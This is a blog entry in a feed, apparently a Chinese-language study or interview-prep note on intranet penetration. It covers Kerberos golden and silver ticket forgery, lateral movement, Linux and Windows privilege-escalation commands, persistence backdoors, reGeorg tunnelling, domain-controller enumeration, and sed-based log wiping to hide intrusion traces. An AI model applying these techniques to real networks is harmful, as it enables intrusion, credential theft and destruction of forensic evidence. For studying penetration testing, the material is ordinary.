    <id>https://liu1272.github.io/2023/08/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</id>
    <published>2023-08-06T05:13:00.000Z</published>
    <updated>2023-08-12T02:48:34.062Z</updated>
    
    <content type="html"><![CDATA[<h5 id="内网渗透的流程"><a href="#内网渗透的流程" class="headerlink" title="内网渗透的流程"></a>内网渗透的流程</h5><ol><li>从外网拿下一个主机当做跳板</li><li>用<code>net user /domian</code>命令查看跳板机是否在域内，探测存活主机</li><li>提权、提取hash</li><li>进行横向移动，定位dc位置</li><li>查看是否有能直接提权域管的漏洞，拿到dc控制权后进行提权</li><li>最后制作黄金票据做好维权，清理日志</li></ol><h5 id="内网渗透的一些基础概念"><a href="#内网渗透的一些基础概念" class="headerlink" title="内网渗透的一些基础概念"></a>内网渗透的一些基础概念</h5><table><thead><tr><th>简写</th><th>全称</th><th>描述</th></tr></thead><tbody><tr><td>DC</td><td>Domain Controller</td><td>域控</td></tr><tr><td>KDC</td><td>Key Distribution Center</td><td>秘钥分发中心</td></tr><tr><td>AD</td><td>Account Database</td><td>账户数据库</td></tr><tr><td>ST</td><td>Service Tickets</td><td>ST服务票据，由TGS服务发送</td></tr><tr><td>AS</td><td>Authentication Server</td><td>身份验证服务，认证用户的身份，并为其发放TGT的服务</td></tr><tr><td>AP</td><td>Application Server</td><td>提供用户所需的服务</td></tr><tr><td>TGS</td><td>Ticket Granting Server</td><td>票据授予发放服务</td></tr><tr><td>TGT</td><td>Ticket Granting Ticket</td><td>TGT认证票据，由AS服务发放，存储在内存，默认有效期为10小时</td></tr><tr><td>黄金票据</td><td>Golden Ticket</td><td>使用域账号krbtgt的NTLM Hash进行加密</td></tr><tr><td>白银票据</td><td>Silver Ticket</td><td>使用服务账户的NTLM Hash进行加密</td></tr></tbody></table><h5 id="socket通信与代理"><a href="#socket通信与代理" class="headerlink" title="socket通信与代理"></a>socket通信与代理</h5><p><strong>两台计算机间的通信</strong>，其实是两台计算机中应用程序（进程）与应用程序（进程）间的通信。但“IP地址”仅能定位到计算机，如何定位到应用程序（进程）呢？答案是“协议+端口”。<br>如果你对同源策略有所了解就能马上反应过来，这就是IP + 协议 + 端口<br><strong>Socket</strong> 就是一个类，封装了许多功能函数，当需要建立连接进行通信时，它会先进行初始化，然后通过内置的功能函数建立连接并完成通信（打开、读/写IO、关闭），其中就包含了TCP的三次握手。<br><strong>正向代理和反向代理</strong>本质上并无区别，正向代理即客户端代理，代理客户端，服务端不知道实际发起请求的客户端。反向代理即服务端代理，代理服务端，客户端不知道实际提供服务的服务端。<br>正向代理可以隐藏用户的信息，并能够将其作为跳板访问我们无法访问的资源，如翻墙。反向代理可以隐藏服务器的信息，保障了内网的安全，同时能够用来实现负载均衡。（负载均衡也是防御DOS攻击的一种方式）<br>在<strong>地址转换与端口映射</strong>中，<code>静态NAT</code>是路由器上手动配置，一个内网地址和一个公网地址相关联，一一对应。<code>动态NAT</code>是路由器上配置一个公网IP地址池，当内网地址访问外网时从地址池里获取公网IP进行映射。当公网IP地址池分配完时，只能等待被占用的公网IP被释放后，其他主机才能获取公网IP访问公网。这种将源地址进行转换的方式也可称之为 SNAT（源地址转换）。<code>NAPT 网络地址端口转换</code>是允许多个内网地址映射到同一个公网IP的不同端口。这种将源地址和端口进行转换的方式也可称之为 SNAPT（源地址端口转换）。<br><strong>端口转发</strong>，有时被叫做隧道，是安全壳（SSH）为网络安全通信使用的一种方法。在内网中，是没有办法直接访问外网的。但是我们可以通过路由器的NAT方式访问外网。<br><strong>内网穿透</strong>是当想要访问内部网络但又没有权限去操作防火墙做端口映射的情况的时候，就需要搭建一条隧道来做端口转发和流量转发。<br><strong>正向socks</strong>：当一个机器同时存在内外网IP时就能在外网通过正向连接去访问其它内网机器，而且这里跳板机就相当于正向代理。因为对于攻击者来说它是可知的，而对于内网机来说，它们并不知道它们返回给跳板机的响应又被发送给了攻击者。<br><a href="https://smms.app/image/iTNEZ9mCukscY68" target="_blank"><img src="https://s2.loli.net/2023/08/06/iTNEZ9mCukscY68.png" ></a><br><strong>反弹socks</strong>：当目标机器没有公网IP，但可访问内网资源时。攻击者可以在内网跳板机上运行EarthWorm使其反弹到某台对外连接的内网服务器上，然后攻击者再通过外网连接到对外服务器进而进入到内网中。这里公网服务器既是正向代理也是反向代理。对于攻击者来说它是可知的，因为我们要通过它访问我们无法访问的资源；对于内网服务器（跳板机）来说它也是可知的，因为我们是在内网服务器（跳板机）上执行的反弹命令，使其反向连接到公网服务器上。而内网服务器（跳板机）在这里充当的仅是公网服务器的正向代理，因为它对于公网服务器来说是可知的，而对于其他内网机来说则是不可知的。<br><a href="https://smms.app/image/wH4klfLjbCJ7Qhi" target="_blank"><img src="https://s2.loli.net/2023/08/06/wH4klfLjbCJ7Qhi.png" ></a></p><h5 id="kerberos协议认证是什么？"><a href="#kerberos协议认证是什么？" class="headerlink" title="kerberos协议认证是什么？"></a>kerberos协议认证是什么？</h5><p>Kerberos是一种网络身份认证的协议，协议设计目的是通过使用秘钥加密技术为客户端/服务器应用程序提供强身份验证。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、修改和插入数据。在以上情况下，Kerberos作为一种可信任的第三方认证服务，通过传统的密码技术执行认证服务。<br><strong>Kerberos认证流程：</strong><br>票据中心授予的票据先去AS身份验证服务，返回身份验证，带着身份验证去TGS拿票据，带着拿回来的票据去服务器。</p><h5 id="白银票据与黄金票据的原理？"><a href="#白银票据与黄金票据的原理？" class="headerlink" title="白银票据与黄金票据的原理？"></a>白银票据与黄金票据的原理？</h5><p><strong>金票</strong>：在 Kerberos 认证中,Client 通过身份认证后,AS 会给 Client一个Logon Session Key 和 TGT,而 Logon Session Key 并不会保存在 KDC 中，krbtgt 的NTLM Hash 又是固定的,所以只要得到 krbtgt 的 NTLM Hash，就可以伪造TGT 和Logon Session Key 来进入下一步 Client 与 TGS 的交互。而已有了金票后,就跳过AS 验证,不用验证账户和密码,所以也不担心域管密码修改。<br><strong>银票</strong>：如果说黄金票据是伪造的 TGT,那么白银票据就是伪造的 ST。在 Kerberos 认证的第三步，Client 带着 ST 和Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后,通过自己的 Master Key 解密 ST,从而获得Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份，验证成功就让 Client 访问 server 上的指定服务了。所以我们只需要知道 Server 用户的Hash 就可以伪造出一个 ST,且不会经过 KDC,但是伪造的门票只对部分服务起作用。<br><strong>金票和银票的区别</strong>：<br>获取的权限不同<br>认证流程不同<br>加密方式不同</p><h5 id="针对kerbores的攻击有哪些？"><a href="#针对kerbores的攻击有哪些？" class="headerlink" title="针对kerbores的攻击有哪些？"></a>针对kerbores的攻击有哪些？</h5><ol><li>用户名爆破</li><li>密码喷洒和密码爆破</li><li>Kerberoasting</li><li>ASRepRoasting</li><li>黄金票据和白银票据</li><li>MS14-068</li><li>非约束委派、约束委派、基于资源的约束委派</li><li>票据传递（ptt/ptk/ptc）</li><li>mimikatz加密降级攻击(万能钥匙)</li><li>使用恶意的kerberos证书做权限维持</li></ol><h5 id="黄金票的条件要求？"><a href="#黄金票的条件要求？" class="headerlink" title="黄金票的条件要求？"></a>黄金票的条件要求？</h5><p>1.域名称 AD PowerShell模块：（Get-ADDomain）.DNSRoot<br>2.域的SID 值 AD PowerShell模块：（Get-ADDomain）.DomainSID.Value（就是域成员SID值去掉最后的）<br>3.目标服务器的 FQDN<br>4.可利用的服务<br>5.域的KRBTGT账户NTLM密码哈希<br>6.需要伪造的用户名<br>一旦攻击者拥有管理员访问域控制器的权限，就可以使用Mimikatz来提取KRBTGT帐户密码哈希值</p><h5 id="票据伪造"><a href="#票据伪造" class="headerlink" title="票据伪造"></a>票据伪造</h5><p>票据分为黄金票据和白银票据。<br>黄金票据是伪造TGT，伪造黄金票据必须拿到域控管理员的权限才可以。<br>伪造黄金票据需要：域名城、域SID值、域的KRBTGT账户、NTLM哈希密码、伪造用户名</p><h5 id="横向连接方式"><a href="#横向连接方式" class="headerlink" title="横向连接方式"></a>横向连接方式</h5><p>$IPC、Psexec、WMI、Schtasks、AT、SC、WINRM</p><h5 id="如何获取内网中机器数量"><a href="#如何获取内网中机器数量" class="headerlink" title="如何获取内网中机器数量"></a>如何获取内网中机器数量</h5><p>可以使用命令net user /domian<br>使用扫描器扫一下</p><h5 id="内网环境不出网怎么办？"><a href="#内网环境不出网怎么办？" class="headerlink" title="内网环境不出网怎么办？"></a>内网环境不出网怎么办？</h5><ol><li>通过webshell实现内网socket代理</li><li>正向链接</li><li>ssh隧道</li><li>协议不同出网的方式不同，如dns对应dnscat2 tcp对应</li><li>测试是否是特定协议或端口出网</li></ol><h5 id="mimikatz使用方法"><a href="#mimikatz使用方法" class="headerlink" title="mimikatz使用方法"></a>mimikatz使用方法</h5><p>mimikatz是一款强大的系统密码破解获取工具。可以破解哈希值，是一个可加载的Meterpreter模块。<br>如果system的权限无法执行执行。需要先进行提权。<br>在meterpreter中输入<code>run post/multi/recon/local_exploit_suggester</code>，进行提权漏洞检测。</p><h5 id="拿下边界机器如何内网渗透？"><a href="#拿下边界机器如何内网渗透？" class="headerlink" title="拿下边界机器如何内网渗透？"></a>拿下边界机器如何内网渗透？</h5><p>拿下机器后，使用代理访问内网<br>windows环境：reGeorg与proxifier<br>Linux环境：reGeorg与proxychains，<br>使用nmap等工具进行扫描，发现web服务的主机和其它信息。有时这些边界机器上会记录一些内网服务器上的一些信息，这时候可以拿到探测的内部一些开放的端口判断进行渗透，通常用户这里基本是统一命名的，拿到的各种记录会暴露出部分内网通讯的ip.</p><h5 id="linux常见的提权办法"><a href="#linux常见的提权办法" class="headerlink" title="linux常见的提权办法"></a>linux常见的提权办法</h5><ol><li>uid提权 (find / -perm -u=s -type f 2&gt;/dev/null)</li><li><code>sudo git help config !/bin/bash</code> 或者 <code>！&#39;sh&#39;</code>完成提权</li><li>脏牛提权</li><li>内核提权</li><li>环境劫持</li><li>suid提权</li><li>cve-2021-4034</li><li>docker提权</li></ol><h5 id="Windows提权的若干办法？"><a href="#Windows提权的若干办法？" class="headerlink" title="Windows提权的若干办法？"></a>Windows提权的若干办法？</h5><ol><li>系统漏洞提权<br>通过 Webshell 命令行执行systeminfo 命令查看系统是否打了提权补丁，可使用 exp 进行提权<br>通过 Webshell 找网站读写执行目录，把 cs 马或提权 exp 上传到对方服务器（如果cmd无法执行命令可单独上传 cmd.exe 到对方服务器，菜刀终端设置为 setpc:\XXX\cmd.exe）</li><li>sc 命令提权（administrator–&gt;system）<br>例如：<code>sc Create syscmd binPath= “cmd /K start” type= own type=interactsc start systcmd</code>就得到了一个system权限的cmd环境</li><li>不带引号的服务路径<br>当服务路径带空格的时候，路径空格目录前面一断就会当作文件执行，如<code>C:\ProgramFiles\MSBuild</code> 这个目录，攻击者只要在c盘创建名为 <code>Program.exe</code> 的木马，最后只要系统重启就会执行 <code>C:\Program.exe</code> 文件。</li><li>不安全的服务权限提升<br>由于管理配置错误，用户可能对服务拥有过多的权限，例如用木马替换服务调用的默认文件。</li><li>绕过系统 UAC 提升<br>可通过 msf 里面的 getsystem 绕过 UAC,也可以通过 kail 模块的exploit/windows/local/bypassuac_injection、exploit/windows/local/bypassuac_vbs、exploit/windows/local/ask 绕过 UAC</li></ol><h5 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h5><p><strong>Windows机器：</strong></p><ol><li>替换系统文件类(shift 后门,放大镜后门)</li><li>修改注册表类<br>自启动项、屏幕保护程序注册表、用户登陆初始化、登录脚本、映像劫持、影子账户、AppCertDlls 注册表项、AppInit_DLLs 注册表项、文件关联、用户登陆初始化、xx.Netsh Helper DLL</li><li>文件类<br>自启动文件夹、office Word StartUp 劫持</li><li>计划任务<br>schtasks 、WMI、bitsadmin</li></ol><p><strong>Linux:</strong></p><ol><li>预加载型动态链接库后门</li><li>strace 后门</li><li>SSH 后门</li><li>SUID 后门</li><li>inetd 服务后门</li><li>协议后门</li><li>vim 后门</li><li>PAM 后门</li><li>进程注入</li><li>Rootkit</li><li>端口复用</li></ol><h5 id="拿到shell后如何接管域控？"><a href="#拿到shell后如何接管域控？" class="headerlink" title="拿到shell后如何接管域控？"></a>拿到shell后如何接管域控？</h5><p>如果拿到的就是域内用户，定位一下域控，提取本机<code>hash</code>看域管是否登陆过本机，是否有域用户的进程之类的注入域用户进程窃取下权限，然后使用一些域内漏洞来提权到域管从而接管域控，然后通过<code>dcsync</code>权限维持或者<code>adminsdhound</code>权限维持，也可以修改机器账号的<code>useraccount</code>为 8192 达成权限维持。<br>（注：把机器账户的UserAccountControl属性修改为8192后，活动目录就会认为这个机器账户是域控）</p><h5 id="内网渗透搭建隧道常见的攻击？"><a href="#内网渗透搭建隧道常见的攻击？" class="headerlink" title="内网渗透搭建隧道常见的攻击？"></a>内网渗透搭建隧道常见的攻击？</h5><p><strong>frp、ew、ssh、Neo-reGeorg、netsh、Lcx</strong><br>网络层：Ipv6情况、icmp情况、Gre隧道0<br>传输层：Tcp 隧道、udp 隧道 常规端口转发<br>应用层：ssh隧道、http隧道、https隧道、dns隧道</p><h5 id="内网横向扩展具体方法？"><a href="#内网横向扩展具体方法？" class="headerlink" title="内网横向扩展具体方法？"></a>内网横向扩展具体方法？</h5><p>密码喷洒、IPC$、WMI、mimikatz、PTH、MS14-068、web漏洞、系统漏洞</p><h5 id="KDC服务默认开放哪些端口？"><a href="#KDC服务默认开放哪些端口？" class="headerlink" title="KDC服务默认开放哪些端口？"></a>KDC服务默认开放哪些端口？</h5><p>88 kerberos krb5、464kerberos kpasswd（v5）</p><h5 id="桌面有管理员会话，想要做会话劫持怎么做？"><a href="#桌面有管理员会话，想要做会话劫持怎么做？" class="headerlink" title="桌面有管理员会话，想要做会话劫持怎么做？"></a>桌面有管理员会话，想要做会话劫持怎么做？</h5><p>提权到system权限，然后去通过工具，就能够劫持任何处于已登录用户的会话，而无需获得该用户的登录凭证。<br>终端服务会话可以是连接状态也可以是未连接状态</p><h5 id="域内攻击方法有什么？"><a href="#域内攻击方法有什么？" class="headerlink" title="域内攻击方法有什么？"></a>域内攻击方法有什么？</h5><p>MS14-068、Roasting攻击离线爆破密码、非约束性委派、基于资源的约束委派、ntlmrelay、CVE-2021-42287/CVE-2021-42278</p><h5 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h5><p>procdump+mimikatz 转储然后用mimikatz离线读取，或者Sam获取然后离线读取。<br>windows server 2012之后，或者打了补丁都抓不到了。<br>只能翻阅文件查找运维等等是否记录密码，或者hash传递、或者获取浏览器的账号密码。</p><h5 id="psexec和wmic的区别"><a href="#psexec和wmic的区别" class="headerlink" title="psexec和wmic的区别"></a>psexec和wmic的区别</h5><p>psexec会记录大量日志，wmic不会记录日志并且更为隐蔽</p><h5 id="横向渗透命令执行手段"><a href="#横向渗透命令执行手段" class="headerlink" title="横向渗透命令执行手段"></a>横向渗透命令执行手段</h5><p>psexec，wmic，smbexec，winrm，net use共享+计划任务+type命令</p><h5 id="内网的白名单如何突破？"><a href="#内网的白名单如何突破？" class="headerlink" title="内网的白名单如何突破？"></a>内网的白名单如何突破？</h5><ul><li>利用已在白名单中的软件执行目标代码，甚至发动无文件攻击</li><li>白名单污染</li><li>暴力破解白名单防护软件</li></ul><h5 id="内网135端口具体有哪些利用方式？"><a href="#内网135端口具体有哪些利用方式？" class="headerlink" title="内网135端口具体有哪些利用方式？"></a>内网135端口具体有哪些利用方式？</h5><p>爆破用户、wmic执行命令进行横向</p><h5 id="怎么做域控定位？"><a href="#怎么做域控定位？" class="headerlink" title="怎么做域控定位？"></a>怎么做域控定位？</h5><p><strong>cmd定位</strong>：<br>net group “Domain controllers” /Domain //查询域控<br>net time /domain//方式来定位域控，显示域控时间<br><strong>DNS解析记录定位</strong>：<br><code>nslookup -type=all _ldap._tcp.dc._msdcs.tubai.com</code><br>若当前主机dns为域内dns，则可以通过解析记录定位端口探测定位：扫描内网中同时开放<code>389</code>、<code>636</code>与<code>53</code>的机器，<code>389</code>默认是<code>LDAP</code>协议端口，<code>636</code>端口是<code>LDAPS</code>，<code>53</code>端口默认是DNS端口，主要用于域名解析，通过DNS服务器可以实现域名与ip地址之间转换，他们都是域控机器开放的端口<br><strong>SPN扫描定位</strong>：由于<code>SPN</code>本身就是正常的<code>kerberos</code>请求，所以扫描隐蔽，它不同于<code>TCP</code>与<code>UDP</code>常规端口扫描。大部分windows已经自带<code>setspn.exe</code>，且此操作无需管理权限<br>命令：setspn -T tubai.com -Q /<br>扫描结果中根据：<code>CN=AD-SERVER,OU=Domain Controllers,DC=tubai,DC=com</code>来进行域控的定位</p><h5 id="域管定位"><a href="#域管定位" class="headerlink" title="域管定位"></a>域管定位</h5><p>net group “Domain Admins” /domain //查询域管理员<br>此外还可以通过一些工具定位：PSloggedon.exe、PVefindaduser.exe、powerView.ps1</p><h5 id="mimikatz是从哪个进程抓hash"><a href="#mimikatz是从哪个进程抓hash" class="headerlink" title="mimikatz是从哪个进程抓hash?"></a>mimikatz是从哪个进程抓hash?</h5><p>mimikatz是从哪个进程抓hash?</p><h5 id="win2012-无法破解hash-怎么上桌面"><a href="#win2012-无法破解hash-怎么上桌面" class="headerlink" title="win2012 无法破解hash 怎么上桌面?"></a>win2012 无法破解hash 怎么上桌面?</h5><p>hash pth传递</p><h5 id="入侵Linux服务器后需要清除哪些日志？"><a href="#入侵Linux服务器后需要清除哪些日志？" class="headerlink" title="入侵Linux服务器后需要清除哪些日志？"></a>入侵Linux服务器后需要清除哪些日志？</h5><p>web日志，如 apache 的 access.log,error.log。<br>直接将日志清除过于明显,一般使用sed 进行定向清除<code>sed -i -e ‘/192.169.1.1/d’</code><br>history 命令的清除，也是对~/.bash_history 进行定向清除<br>wtmp日志的清除   /var/log/wtmp<br>登录日志清除   /var/log/secure</p><h5 id="内网渗透要怎么做？"><a href="#内网渗透要怎么做？" class="headerlink" title="内网渗透要怎么做？"></a>内网渗透要怎么做？</h5><p>第一种方法：<br>在具备Webshell的情况下，通过Webshell直接上传CS木马到对方服务器运行，在CS软件上面开启 SocksProxy代理，把 kail 直接通过cs socksProxy代理攻击内网进行横向渗透。<br>第二种方法：<br>通过reGeorg+Proxifie进行内网渗透，把 tunnel.nosocket.php 脚本通过Webshell上传到 Web 站点目录进行访问，在本地自己电脑上面执行<code>reGeorgSocksProxy.py -p 9999 –u http://IP 地址/tunnel.nosocket.php</code>，最后配置 Proxifier 本地代理地址与端口进行横向内网渗透。</p><h5 id="内网横向渗透的一些攻击技巧"><a href="#内网横向渗透的一些攻击技巧" class="headerlink" title="内网横向渗透的一些攻击技巧"></a>内网横向渗透的一些攻击技巧</h5><ul><li>通过 nmap、nessus 扫描整个内网 ip 主机漏洞</li></ul><pre><code>ms08-067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝2代、cve-2017-7494（samba）、cve-2014-6271(破壳)、php cgi</code></pre><ul><li>通过 nmap 扫内网 Web 站点端口，手动或自动进行漏洞检测</li></ul><pre><code>注入、命令执行、反序列化、文件上传、弱口令等</code></pre><ul><li>通过 ntscan、Bruter、hydra 工具对内网弱口令探测，同时很可能存在密码复用现象</li><li>适当的对内网主机进行 ARP 抓取密码</li><li>如果内网有 AD 域的情况下，可以通过 MS14-068 漏洞、黄金票据、白银票据进行域控攻击，拿下域控就等于基本拿下整个内网</li></ul><h5 id="windows-cmd如何下载文件？"><a href="#windows-cmd如何下载文件？" class="headerlink" title="windows cmd如何下载文件？"></a>windows cmd如何下载文件？</h5><ol><li>certutil.exe</li><li>powershell</li><li>bitsadmin</li><li>vbs</li><li>ftp</li></ol><h5 id="怎么隐藏攻击痕迹？"><a href="#怎么隐藏攻击痕迹？" class="headerlink" title="怎么隐藏攻击痕迹？"></a>怎么隐藏攻击痕迹？</h5><ol><li>跳板</li><li>代理服务器</li><li>Tor</li><li>日志</li><li>清除历史记录</li><li>粉碎文件</li></ol><h5 id="Hash和NTML-hash区别？"><a href="#Hash和NTML-hash区别？" class="headerlink" title="Hash和NTML hash区别？"></a>Hash和NTML hash区别？</h5><p>NTLM Hash（NT LAN Manager）是支持Net NTLM认证协议及本地认证过程中的一个重要参数。其长度为32位，由数字与字母组成。<br>ntml hash生成方式是将明文口令转换成十六进制的格式 转换成Unicode格式，即在每个字节之后添加0x00对Unicode字符串作MD4加密，生成32位十六进制数字串</p><h5 id="内网中的信息收集技术"><a href="#内网中的信息收集技术" class="headerlink" title="内网中的信息收集技术"></a>内网中的信息收集技术</h5><pre><code>【主机信息收集】1. 网络配置 ipconfig /all2. 操作系统 systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;3. 软件信息 systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;4. 服务信息 wmic /namespace:\root\securitycenter2 pathantivirusproduct GET displayName,productState,pathToSignedProductExe5. 用户列表 net user6. 本地管理员信息 net localgroup administrators7. 端口信息 netstat –ano8. 补丁信息 wmic qfe get Caption,Description,HotFixID,InstalledOn9. 查防火墙 netsh firewall show config【域内信息收集】是否有域：使用ipconfig /all命令可以查看网关IP地址、DNS的IP地址以及判断当前主机是否在域内：通过反 向解析查询命令nslookup来解析域名的IP地址，使用解析出来的IP地址进行对比，判断域控制器和 DNS服务器是否在同一台服务器上登录域信息：net config workstationICMP探测内网：for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.174.%I | findstr &quot;TTL=&quot;ARP探测内网：端口信息收集：查询域信息：net view /domain查询域主机：net view /domain:XXX查询域用户：net group /domain查找域控：Nslookup -type=SRV _ldap._tcp net time /domain net group &quot;Domain Controllers&quot; /domain查域用户信息：net user /domain查询域管理员：net group &quot;Domain Admins&quot; /domain查询域sid信息：whoami /all</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;内网渗透的流程&quot;&gt;&lt;a href=&quot;#内网渗透的流程&quot; class=&quot;headerlink&quot; title=&quot;内网渗透的流程&quot;&gt;&lt;/a&gt;内网渗透的流程&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;从外网拿下一个主机当做跳板&lt;/li&gt;
&lt;li&gt;用&lt;code&gt;net user /domi</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
</feed>
